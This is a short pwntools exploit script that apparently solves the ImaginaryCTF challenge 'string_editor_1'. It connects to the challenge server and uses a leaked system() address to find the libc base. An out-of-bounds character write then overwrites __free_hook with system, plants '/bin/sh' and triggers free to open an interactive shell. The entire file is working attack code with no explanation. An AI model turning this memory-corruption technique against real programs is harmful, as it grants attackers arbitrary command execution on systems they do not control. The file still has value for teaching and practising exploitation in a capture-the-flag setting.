from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

# io = process("./string_editor_1")
io = remote("chal.imaginaryctf.org", 42004)


def edit(idx, x):
    io.sendlineafter(b"What character would you like to edit?", str(idx))
    io.sendlineafter(b"What character should be in that index?", chr(x))


def recvdebug():
    io.recvuntil(b"DEBUG: ")
    return int(io.recvlineS().strip(), 16)


def writebytes(idx, b: bytes):
    for i in range(len(b)):
        edit(idx + i, b[i])


io.recvuntil(b"But first, a word from our sponsors: ")
system = int(io.recvlineS().strip(), 16)
libc_base = system - 0x55410
print("libc_base", hex(libc_base))
__free_hook = libc_base + 0x1EEB28
print(hex(__free_hook))

edit(0, 0x20)
ptr = recvdebug()
print(hex(ptr))

writebytes(__free_hook - ptr, p64(system))
writebytes(0, b"/bin/sh\0")

# free
io.sendlineafter(b"What character would you like to edit?", "15")

io.interactive()
